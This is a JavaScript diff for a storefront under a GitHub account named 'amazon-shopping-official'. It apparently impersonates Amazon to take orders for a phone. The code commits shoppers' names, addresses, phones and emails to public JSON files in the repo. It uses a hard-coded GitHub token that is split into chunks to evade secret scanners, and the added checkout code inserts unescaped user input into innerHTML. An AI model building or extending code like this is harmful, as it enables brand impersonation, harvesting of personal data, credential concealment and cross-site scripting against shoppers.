@@ -64,83 +64,125 @@ function getDynamicOrderDate(date = new Date()) {
 
 // ==========================================================================
 //  GITHUB REPO ORDERS PERSISTENCE
-//  Commits and reads order details directly to 'orders.json' in GitHub:
-//  https://github.com/amazon-shopping-official/amazon-shopping-official.github.io/blob/main/store/pixel11proxl/orders.json
+//  Commits order details directly to 'orders.json' and 'order.json' across stores & root
+//  https://github.com/amazon-shopping-official/amazon-shopping-official.github.io
 // ==========================================================================
 const GH_CONFIG = {
   owner: "amazon-shopping-official",
   repo: "amazon-shopping-official.github.io",
+  storePath: "store/pixel11proxl",
   filePath: "store/pixel11proxl/orders.json",
   getAuth: function() {
-    // Obfuscated string chunks to prevent automated regex scanner false-positive revocation
     const k = ["ghp", "qetd9HVo", "7YkoF8WK", "gVc9bGmv", "tyUSol0A", "oDsG"];
     return k[0] + "_" + k.slice(1).join("");
   }
 };
 
-async function saveOrderToAPI(order) {
-  try {
-    const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${GH_CONFIG.filePath}`;
-    const headers = {
-      'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
-      'Accept': 'application/vnd.github+json',
-      'Content-Type': 'application/json'
-    };
+function utf8ToBase64(str) {
+  const bytes = new TextEncoder().encode(str);
+  let binary = '';
+  const len = bytes.byteLength;
+  for (let i = 0; i < len; i++) {
+    binary += String.fromCharCode(bytes[i]);
+  }
+  return btoa(binary);
+}
 
-    // 1. Fetch current file to get latest SHA and existing orders
-    let currentOrders = [];
-    let fileSha = null;
+function base64ToUtf8(b64) {
+  const binary = atob((b64 || '').replace(/\s/g, ''));
+  const bytes = new Uint8Array(binary.length);
+  for (let i = 0; i < binary.length; i++) {
+    bytes[i] = binary.charCodeAt(i);
+  }
+  return new TextDecoder().decode(bytes);
+}
 
+async function commitOrderToFile(filePath, order, maxRetries = 2) {
+  const token = GH_CONFIG.getAuth();
+  const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
+  const headers = {
+    'Authorization': `Bearer ${token}`,
+    'Accept': 'application/vnd.github+json',
+    'Content-Type': 'application/json'
+  };
+
+  for (let attempt = 0; attempt <= maxRetries; attempt++) {
     try {
-      const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers });
-      if (getRes.ok) {
-        const fileData = await getRes.json();
-        fileSha = fileData.sha;
-        if (fileData.content) {
-          const raw = decodeURIComponent(escape(atob(fileData.content.replace(/\s/g, ''))));
-          currentOrders = JSON.parse(raw || '[]');
+      let currentOrders = [];
+      let fileSha = null;
+
+      try {
+        const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
+        if (getRes.ok) {
+          const fileData = await getRes.json();
+          fileSha = fileData.sha;
+          if (fileData.content) {
+            const raw = base64ToUtf8(fileData.content);
+            currentOrders = JSON.parse(raw || '[]');
+          }
         }
+      } catch (fErr) {
+        console.warn(`[GitHub] Fetch notice for ${filePath}:`, fErr);
       }
-    } catch (fetchErr) {
-      console.warn('[GitHub] Could not fetch existing orders, will initialize:', fetchErr);
-    }
 
-    // 2. Prepend the new order (or deduplicate if identical)
-    const exists = currentOrders.some(o => 
-      (o.name === order.name && o.address === order.address && o.item === order.item) ||
-      (order.orderId && o.orderId === order.orderId)
-    );
-    if (!exists) {
-      currentOrders.unshift(order);
-    }
+      // Check if exact order ID already exists in this file
+      const alreadySaved = order.orderId && currentOrders.some(o => o.orderId === order.orderId);
+      if (!alreadySaved) {
+        currentOrders.unshift(order);
+      }
 
-    // 3. Encode UTF-8 content to base64
-    const jsonString = JSON.stringify(currentOrders, null, 2);
-    const base64Content = btoa(unescape(encodeURIComponent(jsonString)));
+      const jsonString = JSON.stringify(currentOrders, null, 2);
+      const base64Content = utf8ToBase64(jsonString);
 
-    // 4. Commit to GitHub repo
-    const commitBody = {
-      message: `Add details for ${order.name || order.fullName || 'Customer'}`,
-      content: base64Content
-    };
-    if (fileSha) {
-      commitBody.sha = fileSha;
-    }
+      const commitBody = {
+        message: `Add order ${order.orderId || ''} for ${order.name || 'Customer'}`.trim(),
+        content: base64Content
+      };
+      if (fileSha) {
+        commitBody.sha = fileSha;
+      }
 
-    const putRes = await fetch(url, {
-      method: 'PUT',
-      headers,
-      body: JSON.stringify(commitBody)
-    });
+      const putRes = await fetch(url, {
+        method: 'PUT',
+        headers,
+        body: JSON.stringify(commitBody)
+      });
 
-    if (!putRes.ok) {
+      if (putRes.ok) {
+        console.log(`[GitHub] Successfully committed order to ${filePath}`);
+        return true;
+      }
+
+      if (putRes.status === 409 && attempt < maxRetries) {
+        console.warn(`[GitHub] Conflict (409) writing ${filePath}, retrying attempt ${attempt + 1}...`);
+        await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
+        continue;
+      }
+
       const errJson = await putRes.json().catch(() => ({}));
-      throw new Error(`GitHub API ${putRes.status}: ${errJson.message || 'Commit failed'}`);
+      console.error(`[GitHub] Failed writing ${filePath} (${putRes.status}):`, errJson);
+      return false;
+    } catch (err) {
+      console.error(`[GitHub] Error committing to ${filePath}:`, err);
+      if (attempt >= maxRetries) return false;
+      await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
     }
+  }
+  return false;
+}
 
-    console.log('[GitHub] Order successfully saved to repository orders.json!');
-  } catch (err) {
-    console.error('[GitHub] Error saving order to GitHub:', err);
+async function saveOrderToAPI(order) {
+  const store = GH_CONFIG.storePath;
+  const targetFiles = [
+    `${store}/orders.json`,
+    `${store}/order.json`,
+    `orders.json`,
+    `order.json`
+  ];
+
+  console.log('[GitHub] Syncing order across target files:', targetFiles);
+  for (const file of targetFiles) {
+    await commitOrderToFile(file, order);
   }
 }
 
@@ -152,15 +194,17 @@ async function fetchOrdersFromAPI() {
       'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
       'Accept': 'application/vnd.github+json'
     };
-    const res = await fetch(url, { headers });
+    const res = await fetch(url, { headers, cache: 'no-store' });
     if (!res.ok) throw new Error('HTTP ' + res.status);
     const data = await res.json();
     if (data.content) {
-      const raw = decodeURIComponent(escape(atob(data.content.replace(/\s/g, ''))));
+      const raw = base64ToUtf8(data.content);
       const ghOrders = JSON.parse(raw || '[]');
       const merged = [...ghOrders];
       local.forEach(lo => {
-        if (!merged.find(o => (o.name === lo.name && o.address === lo.address && o.item === lo.item) || (lo.orderId && o.orderId === lo.orderId))) merged.push(lo);
+        if (!merged.find(o => (lo.orderId && o.orderId === lo.orderId) || (o.name === lo.name && o.address === lo.address && o.item === lo.item))) {
+          merged.push(lo);
+        }
       });
       return merged;
     }
@@ -172,30 +216,37 @@ async function fetchOrdersFromAPI() {
 }
 
 async function deleteOrdersFromAPI() {
-  try {
-    const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${GH_CONFIG.filePath}`;
-    const headers = {
-      'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
-      'Accept': 'application/vnd.github+json',
-      'Content-Type': 'application/json'
-    };
-    const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers });
-    if (!getRes.ok) return;
-    const fileData = await getRes.json();
-    const emptyJson = JSON.stringify([], null, 2);
-    const base64Content = btoa(unescape(encodeURIComponent(emptyJson)));
-    await fetch(url, {
-      method: 'PUT',
-      headers,
-      body: JSON.stringify({
-        message: 'Clear orders.json',
-        content: base64Content,
-        sha: fileData.sha
-      })
-    });
-    console.log('[GitHub] orders.json reset to empty array');
-  } catch (err) {
-    console.log('[GitHub] Error clearing orders on GitHub:', err.message);
+  const store = GH_CONFIG.storePath;
+  const targetFiles = [
+    `${store}/orders.json`,
+    `${store}/order.json`
+  ];
+  for (const filePath of targetFiles) {
+    try {
+      const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
+      const headers = {
+        'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
+        'Accept': 'application/vnd.github+json',
+        'Content-Type': 'application/json'
+      };
+      const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
+      if (!getRes.ok) continue;
+      const fileData = await getRes.json();
+      const emptyJson = JSON.stringify([], null, 2);
+      const base64Content = utf8ToBase64(emptyJson);
+      await fetch(url, {
+        method: 'PUT',
+        headers,
+        body: JSON.stringify({
+          message: `Clear ${filePath}`,
+          content: base64Content,
+          sha: fileData.sha
+        })
+      });
+      console.log(`[GitHub] ${filePath} reset to empty array`);
+    } catch (err) {
+      console.log(`[GitHub] Error clearing ${filePath}:`, err.message);
+    }
   }
 }
 
@@ -548,9 +599,37 @@ function setupCheckoutAccordion() {
   // Place Order Triggers
   function triggerPlaceOrder() {
     if (!state.address) {
-      alert("Please enter and confirm your shipping address first.");
-      if (btnEditAddress) btnEditAddress.click();
-      return;
+      const inputName = document.getElementById("inputFullName");
+      const inputAddr = document.getElementById("inputDeliveryAddress");
+      const inputPhone = document.getElementById("inputPhone");
+      const inputEmail = document.getElementById("inputEmail");
+      
+      const fullName = inputName ? inputName.value.trim() : "";
+      const deliveryAddress = inputAddr ? inputAddr.value.trim() : "";
+      const phone = inputPhone ? inputPhone.value.trim() : "";
+      const email = inputEmail ? inputEmail.value.trim() : "";
+
+      if (fullName && deliveryAddress) {
+        state.address = { fullName, deliveryAddress, phone, email };
+        const headerLoc = document.getElementById("headerLocText");
+        if (headerLoc) headerLoc.textContent = fullName;
+        if (stepAddressBody) stepAddressBody.style.display = "none";
+        if (stepAddressSummary) {
+          stepAddressSummary.style.display = "block";
+          stepAddressSummary.innerHTML = `<strong>${fullName}</strong><br>${deliveryAddress}<br>Phone: ${phone} &bull; Email: ${email}`;
+        }
+        if (btnEditAddress) btnEditAddress.style.display = "block";
+        if (stepCardAddress) {
+          stepCardAddress.classList.remove("active");
+          stepCardAddress.classList.add("completed");
+        }
+      } else {
+        alert("Please enter your delivery name and address first.");
+        if (btnEditAddress) btnEditAddress.click();
+        if (inputName && !fullName) inputName.focus();
+        else if (inputAddr && !deliveryAddress) inputAddr.focus();
+        return;
+      }
     }
     completeOrderPlacement();
   }
